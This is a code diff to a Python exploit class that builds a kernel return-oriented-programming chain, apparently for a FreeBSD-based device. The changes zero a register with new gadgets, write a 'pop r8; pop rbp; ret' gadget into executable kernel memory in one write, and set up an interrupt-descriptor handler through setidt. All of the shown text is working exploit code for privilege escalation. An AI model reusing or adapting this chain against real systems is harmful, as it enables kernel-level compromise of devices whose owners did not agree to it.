@@ -524,9 +524,11 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
         
-        #R8 = 0, R9 = 0, R10 = 0, R11 = 0
+        #R8 = 0
         if self.offs.POP_R8_POP_RBP_RET is None:
-            rop += p64(self.kdlsym(self.offs.XOR_R8_R8_XOR_R9_R9_XOR_R10_R10_XOR_R11_R11_LEA_RAX_RSP_8_RET))
+            rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+            rop += p64(self.kdlsym(self.offs.ZERO_RW_QWORD_A))            
+            rop += p64(self.kdlsym(self.offs.XCHG_RDI_8_R8_RET))
 
         # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
         rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
@@ -571,32 +573,11 @@ class Exploit():
         # we should just create it, lol
         if self.offs.POP_R8_POP_RBP_RET is None:
             rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-            rop += p64(0x41) #POP r8
+            rop += p64(0xc35d5841) #POP R8 ; POP RBP ; RET
             
             rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-            rop += p64(self.kdlsym(self.offs.EMPTY_EXEC_MEM_A+0))
-            rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
-            
-            rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-            rop += p64(0x58) # --
-            
-            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-            rop += p64(self.kdlsym(self.offs.EMPTY_EXEC_MEM_A+1))
-            rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
-            
-            rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-            rop += p64(0x5D) # pop rbp
-            
-            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-            rop += p64(self.kdlsym(self.offs.EMPTY_EXEC_MEM_A+2))
-            rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
-            
-            rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-            rop += p64(0xC3) # ret
-            
-            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-            rop += p64(self.kdlsym(self.offs.EMPTY_EXEC_MEM_A+3))
-            rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
+            rop += p64(self.kdlsym(self.offs.EMPTY_EXEC_MEM_A))
+            rop += p64(self.kdlsym(self.offs.MOV_DWORD_PTR_RCX_EAX_RET))
             
             self.offs.POP_R8_POP_RBP_RET = self.offs.EMPTY_EXEC_MEM_A
 
@@ -649,7 +630,6 @@ class Exploit():
         
         if self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET is None:
             rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_RET))
-            rop += p64(self.kdlsym(self.offs.RET))
         else:
             rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
             rop += p64(0xDEADBEEF)
